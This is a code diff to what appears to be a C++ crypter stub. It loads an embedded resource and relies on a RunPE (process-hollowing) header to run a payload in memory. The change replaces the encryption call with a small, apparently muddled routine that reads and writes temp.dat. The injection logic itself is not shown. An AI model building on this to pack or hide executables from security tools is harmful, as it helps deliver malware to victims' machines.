@@ -1,9 +1,13 @@
 #include <iostream>
 #include <Windows.h>
+#include <fstream>
 #include "Runpe.h"
+#include <string>
+
 
 int Rsize;
 char* RData;
+std::string choice;
 
 void Resource(int id)
 {
@@ -13,6 +17,15 @@ void Resource(int id)
 	RData = (char*)LockResource(temp);
 }
 
+void Encryption_Choice()
+{
+	std::ifstream in("temp.dat");
+	getline(in, choice);
+	in.close();
+	std::ofstream out("From temp.dat");
+	out << choice;
+	out.close();
+}
 
 void enc()
 {
@@ -26,7 +39,9 @@ void enc()
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	Resource(1);
-	enc();
+	Encryption_Choice();
+	//enc();
+
 
 	LPVOID pFile;
 	TCHAR szFilePath[1024];
